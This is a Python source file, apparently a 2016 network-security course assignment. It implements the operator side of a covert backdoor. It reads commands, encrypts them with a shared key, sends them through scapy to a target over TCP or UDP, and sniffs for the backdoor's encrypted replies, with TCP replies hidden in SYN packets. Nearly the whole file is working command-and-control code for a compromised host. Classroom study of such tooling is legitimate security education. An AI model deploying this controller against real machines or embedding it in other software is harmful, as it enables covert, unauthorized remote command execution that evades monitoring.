#! /usr/bin/env python
# -*- coding: utf-8 -*-

# Mario Enriquez, 2016. COMP 8505 Assignment 3
#
# Backdoor master, issues commands so that the backdoor executes them
# Run:
#		python command.py dest_ip protocol dest_port rec_port key

from scapy.all import *
from random import randint
from cyphermod import *
import sys

def pkt_callback(pkt): #function called when the sniffer gets a packet
  layers = []
  counter = 0
  while True: #get all the layers inside the packet
    layer = pkt.getlayer(counter)
    if (layer != None):
      layers.append(layer.name)
    else:
      break
    counter += 1
  valid=0 
  if any("IP" in s for s in layers): 
    valid=1
  if valid==0:
    return
  if str(pkt[IP].proto) == "6": #packet is TCP
    payload = str(pkt[TCP].payload) # We get payload from the TCP segment
    F = pkt['TCP'].flags
    if not F & 0x02: #check that the message is a SYN, to prevent getting nothing
      return
  elif str(pkt[IP].proto) == "17": #packet is UDP
    payload = str(pkt[Raw].load)
  else: #packet is neither TCP nor UDP
    return
  decoded=decode(key,payload) #calls function on cyphermod
  print decoded
  if(decoded=="END............."): #if we get the last packet, we ask for user input
    command = raw_input('Enter a command: ')
    if len(command) > 0:
      command = command + (" "* (16-(len(command)%16)))
      encoded=encode(key,command)
      pkt=send(IP(dst=dsthost)/PROTO/encoded, verbose=0)
    else:
      sys.exit()

def validate_ip(ip): #validates that ip is correct
  num = ip.split('.')
  if len(num) != 4:
    return False
  for x in num:
    if not x.isdigit():
      return False
    i = int(x)
    if i < 0 or i > 255:
      return False
  return True

def validate_port(port): #validates that ip is between 0 and 65535
  if not port.isdigit():
    return False
  i = int(port)
  if i < 0 or i > 65535:
    return False
  return True

def validate_key(key): #validates that key length is correct
  if len(key) > 32 or len(key) < 8:
    return False
  return True  

if len(sys.argv) < 6: #number of arguments is correct
  print("\n	Usage: python command.py dest_ip protocol dest_port rec_port key\n")
  sys.exit()
if validate_ip(sys.argv[1]) == False: #checks if ip argument is correct
  print("\n	Please Input valid ip.")
  print("	Usage: python command.py dest_ip protocol dest_port key\n")
  sys.exit()
if not ((str(sys.argv[2]) == "UDP") or (str(sys.argv[2]) == "TCP")): #checks if protocol argument is correct
  print("\n	Please Input valid protocol.")
  print("	Usage: python command.py dest_ip protocol dest_port key\n")
  sys.exit()
if validate_port(sys.argv[3]) == False: #checks if destination port argument is correct
  print("\n	Please Input valid port.")
  print("	Usage: python command.py dest_ip protocol dest_port key\n")
  sys.exit()
if validate_port(sys.argv[4]) == False: #checks if receiving port argument is correct
  print("\n	Please Input valid port.")
  print("	Usage: python command.py dest_ip protocol dest_port key\n")
  sys.exit()
if validate_key(sys.argv[5]) == False: #checks if key argument is correct
  print("\n	Please Input valid key: minimum 8 characters, maximum 32 characters")
  print("	Usage: python command.py dest_ip dest_port key\n")
  sys.exit()
dsthost=sys.argv[1]
dstport=int(sys.argv[3])
recport=int(sys.argv[4])
if len(sys.argv[5]) < 16: #transforms key to 16, 24 or 32 if not enough
  key=sys.argv[5] + (" "*(16-len(sys.argv[5])))
elif len(sys.argv[5]) < 24:
  key=sys.argv[5] + (" "*(24-len(sys.argv[5])))
elif len(sys.argv[5]) < 32:
  key=sys.argv[5] + (" "*(32-len(sys.argv[5])))
srcport=random.randint(1024,65535) #set sourceport as random
if(str(sys.argv[2]) == "TCP"): #set sniffer and send values
  PROTO=TCP(sport=srcport,dport=dstport)
  sniff_filter= "tcp and dst port " + str(recport)
else:
  PROTO=UDP(sport=srcport,dport=dstport)
  sniff_filter= "udp and dst port " + str(recport)
command = raw_input('Enter a command: ') #get user input
if len(command) > 0: #execute user input if > 0
  command = command + (" "* (16-(len(command)%16)))
  encoded=encode(key,command)
  pkt=send(IP(dst=dsthost)/PROTO/encoded, verbose=0)
sniff(iface="eno1", prn=pkt_callback, filter=sniff_filter, store=0) #start sniffing
